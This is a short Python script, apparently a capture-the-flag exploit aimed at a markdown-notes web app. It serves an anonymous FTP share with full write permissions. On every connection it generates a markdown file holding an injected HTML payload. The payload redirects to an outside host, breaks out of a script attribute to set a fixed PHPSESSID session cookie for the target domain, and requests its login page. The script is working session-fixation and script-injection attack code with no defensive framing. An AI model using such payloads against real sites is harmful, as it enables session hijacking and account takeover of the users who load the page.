from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import os
import secrets

authorizer = DummyAuthorizer()
authorizer.add_anonymous(os.getcwd(), perm='elradfmw')  # Allows all permissions to anonymous users

def gen():
    html = '''
<meta http-equiv="refresh" content="0.5; url=http://domain.tld:5000/splitline{sess}">
<script src="/';document.cookie='PHPSESSID=splitline{sess};path=/login.php;domain=.md-notes.space';(new(Image)).src='http://app.md-notes.space/login.php';//"></script>
    '''.format(sess=secrets.token_hex(6))
    with open("0000-00-00-stage1.md", "w") as f:
        f.write(html)

class CustomHandler(FTPHandler):
    def on_connect(self):
        gen()
        super().on_connect()

# Set up the FTP server
handler = CustomHandler
handler.authorizer = authorizer
server = FTPServer(("0.0.0.0", 2121), handler)

# Start the FTP server
server.serve_forever()

